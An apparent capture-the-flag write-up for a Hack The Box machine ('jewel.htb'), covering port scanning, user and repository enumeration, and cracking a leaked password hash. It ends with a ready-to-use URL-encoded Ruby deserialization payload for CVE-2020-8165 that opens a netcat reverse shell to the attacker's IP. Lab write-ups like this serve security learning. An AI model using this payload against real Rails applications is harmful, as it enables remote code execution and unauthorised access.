---
published: false
---
<h1>Scanning</h1>

<img src="https://i.ibb.co/dbW2t85/Screenshot-from-2021-02-13-17-25-59.png" alt="Screenshot-from-2021-02-13-17-25-59" border="0"> 

<p>We found port 22 for ssh and port 8000,8080 for HTTP where port 8000</p>

<p>Let`s add jewel.htb in our hosts </p>

<img src="https://i.ibb.co/5v1Xjw8/Screenshot-from-2021-02-13-17-54-04.png" alt="Screenshot-from-2021-02-13-17-54-04" border="0">

<h2>Port 8000</h2>
<img src="https://i.ibb.co/kxyH5Kj/Screenshot-from-2021-02-13-18-01-04.png" alt="Screenshot-from-2021-02-13-18-01-04" border="0">

<h2>port 8080</h2>
<img src="https://i.ibb.co/37D1z6D/Screenshot-from-2021-02-13-18-01-35.png" alt="Screenshot-from-2021-02-13-18-01-35" border="0">

<p>Let`s enumerate the BLOG!</p>
<img src="https://i.ibb.co/FmT1Ppz/Bill.png" alt="Bill" border="0">
<img src="https://i.ibb.co/s9vmvfL/Jennifer.png" alt="Jennifer" border="0">
<p>We found 2 user Bill,Jennifer </p>

<p>Let`s enumerate the REPO </p>
<img src="https://i.ibb.co/0fNWrZK/Screenshot-from-2021-02-13-18-15-14.png" alt="Screenshot-from-2021-02-13-18-15-14" border="0">

<p>After some enumerating i found SQL file "bd.sql" and i got some hashes</p>
<img src="https://i.ibb.co/d08S7kv/Screenshot-from-2021-02-13-18-18-20.png" alt="Screenshot-from-2021-02-13-18-18-20" border="0">

<p>I could break Bill hash "spongebob" but couldn`t login, let`s countinue enumeration</p>
<img src="https://i.ibb.co/JKpyJ9q/Screenshot-from-2021-02-13-18-27-25.png" alt="Screenshot-from-2021-02-13-18-27-25" border="0">
<p>It`s using ruby '2.5.5' , let`s search for an exploit</p>
<p>After searching i found a CVE</p><a href="https://github.com/masahiro331/CVE-2020-8165">CVE-2020-8165</a> 
<p>I tested all the fields and i found that the vulnerable input in updating user fields</p>
<p>Payload <blockquote>%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22U%60rm+%2Ftmp%2Ff%3Bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.XX.XX+9001+%3e%2Ftmp%2ff%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T</blockquote></p>
<p>Change the ip to your ip</p>
